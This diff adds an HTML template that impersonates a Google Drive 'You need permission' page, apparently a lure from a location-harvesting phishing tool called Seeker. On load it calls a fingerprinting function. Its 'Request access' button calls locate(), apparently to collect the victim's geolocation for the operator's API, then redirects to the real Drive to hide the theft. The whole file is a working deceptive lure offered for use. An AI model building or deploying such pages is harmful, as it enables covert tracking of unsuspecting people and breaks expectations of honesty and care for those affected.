@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Drive - Access Denied</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+      background: #fff;
+      color: #202124;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .drive-icon { width: 72px; height: 72px; margin-bottom: 24px; }
+    .drive-icon svg { width: 100%; height: 100%; fill: #4285f4; }
+    .card {
+      max-width: 420px;
+      text-align: center;
+    }
+    h1 { font-size: 1.75rem; font-weight: 400; margin-bottom: 8px; }
+    p { color: #5f6368; font-size: 1rem; line-height: 1.5; margin-bottom: 24px; }
+    .btn {
+      display: inline-block;
+      padding: 10px 24px;
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 0.95rem;
+      font-weight: 500;
+      cursor: pointer;
+    }
+    .btn:hover { background: #1765cc; }
+    #status { margin-top: 16px; font-size: 0.9rem; color: #5f6368; }
+  </style>
+</head>
+<body>
+  <div class="drive-icon">
+    <svg viewBox="0 0 24 24"><path d="M7.71 3.5L1.15 15l3.42 6h6.84L14.56 15 7.71 3.5zm1.58 12.5H4.58l2.14-3.71 2.71 3.71zM12 10.5L8.29 4.5H15.7L12 10.5zm5.42 17l3.43-6H12.71l2.71-4H22.85L16.29 3.5h-4.58L12 8.5l-.71-5H6.71L.15 15l6.56 11.5h12.58z"/></svg>
+  </div>
+  <div class="card">
+    <h1>You need permission</h1>
+    <p>Want in? Request access, or switch to an account with permission.</p>
+    <button id="requestBtn" class="btn" onclick="handleRequest()">Request access</button>
+    <div id="status"></div>
+  </div>
+  <script>
+    window.SEEKER_API_BASE = {{ api_base }};
+  </script>
+  <script src="/static/seeker/js/location.js"></script>
+  <script>
+    information();
+    function handleRequest() {
+      var btn = document.getElementById('requestBtn');
+      var status = document.getElementById('status');
+      btn.disabled = true;
+      btn.textContent = 'Requesting...';
+      var redirectUrl = {{ redirect_url }} || 'https://drive.google.com';
+      locate(
+        function() {
+          status.textContent = 'Request sent. Redirecting...';
+          window.location.href = redirectUrl;
+        },
+        function(err, msg) {
+          status.textContent = 'Unable to send request. ' + (msg || '');
+          btn.disabled = false;
+          btn.textContent = 'Request access';
+        }
+      );
+    }
+  </script>
+</body>
+</html>
